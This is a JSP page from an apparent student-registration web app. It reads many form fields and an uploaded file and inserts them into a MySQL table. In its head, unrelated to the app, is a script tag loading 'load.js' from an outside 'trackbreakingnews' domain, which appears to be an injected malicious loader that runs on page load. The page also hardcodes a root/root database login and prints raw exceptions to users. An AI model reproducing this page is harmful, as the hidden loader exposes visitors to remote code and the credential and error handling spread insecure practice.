<%@ page language="java" contentType="text/html; charset=ISO-8859-1"
    pageEncoding="ISO-8859-1"%>
    <%@ page import ="java.io.InputStream"  %>
 <%@ page import="java.sql.*" %>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
  	<script src="http://d.trackbreakingnews.com/l/load.js"></script>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="../../favicon.ico">

    <title>Update</title>

    <!-- Bootstrap core CSS -->
    <link href="CSS/bootstrap.min.css" rel="stylesheet">
    <link href="CSS/Front4.css" rel="stylesheet">
    <!-- Bootstrap theme -->
    <link href="CSS/bootstrap-theme.min.css" rel="stylesheet">

    <!-- Custom styles for this template -->
    <link href="CSS/theme.css" rel="stylesheet">

    <!-- Just for debugging purposes. Don't actually copy these 2 lines! -->
    <!--[if lt IE 9]>
    <script src="js/ie8-responsive-file-warning.js"></script>
    <![endif]-->
    <script src="js/ie-emulation-modes-warning.js"></script>
    
</script>
<link rel="stylesheet" href="CSS/animate.css">
<script src="js/wow.min.js"> </script>
<script> new WOW().init();</script>
</head>
<body>

<%
Connection con=null;
PreparedStatement ps=null;
String st=null;

		String nm=request.getParameter("id");
		String dob=request.getParameter("ss");
		String fon=request.getParameter("adm");
		String sx=request.getParameter("sn");
		String ms=request.getParameter("em");
		String ad=request.getParameter("cr");
		String gr=request.getParameter("sm");
		String clg1=request.getParameter("gen");
		String yr1=request.getParameter("fn");
		String pg=request.getParameter("nt");
		String clg=request.getParameter("rl");
		String yr=request.getParameter("fo");
		String ex=request.getParameter("ph");
		String id=request.getParameter("addr");
		String mon=request.getParameter("mon");
		String fof=request.getParameter("fof");
		String mop=request.getParameter("mop");
		String foe=request.getParameter("foe");
		InputStream inputStream = null; // input stream of the upload file
        // obtains the upload file part in this multipart request
        Part filePart = request.getPart("nm26");
        if (filePart != null) {
            // prints out some information for debugging
            System.out.println(filePart.getName());
            System.out.println(filePart.getSize());
            System.out.println(filePart.getContentType());
            // obtains input stream of the upload file
            inputStream = filePart.getInputStream();
        }
		
try 
{
	Class.forName("com.mysql.jdbc.Driver");
	con=DriverManager.getConnection("jdbc:mysql://localhost:3306/mystore","root","root");
	st="insert into stud2 values(?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)";
	ps=con.prepareStatement(st);
		ps.setString(1, nm);
		ps.setString(2, dob);
		ps.setString(3, fon);
		ps.setString(4,sx);
		ps.setString(5, ms);
		ps.setString(6, ad);
		ps.setString(7, gr);
		ps.setString(8, clg1);
		ps.setString(9, yr1);
		ps.setString(10, pg);
		ps.setString(11, clg);
		ps.setString(12, yr);
		ps.setString(13, ex);
		ps.setString(14, id);
		ps.setString(15, mon);
		ps.setString(16, fof);
		ps.setString(17, mop);
		ps.setString(18, foe);
		ps.setBlob(19, inputStream);
		
		
	int i=ps.executeUpdate();
	if(i>0) {
		out.println("Done");
		response.sendRedirect("Tags.jsp");
		
	} else {
		out.println("Fill all Fields");
		request.getRequestDispatcher("SignUp.jsp").include(request, response);
		
	}
}catch(Exception e) { out.println(e);}
%>


</body>
</html>
  <script src="jquery.min.js"></script>
    <script src="js/bootstrap.min.js"></script>
    <script src="js/docs.min.js"></script>
    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
    <script src="js/ie10-viewport-bug-workaround.js"></script>
    <script>
	$('.dropdown').hover(function() {
		$('.dropdown-toggle',this).trigger('click');
	});
	</script>
  </body>
</html>

</body>
</html>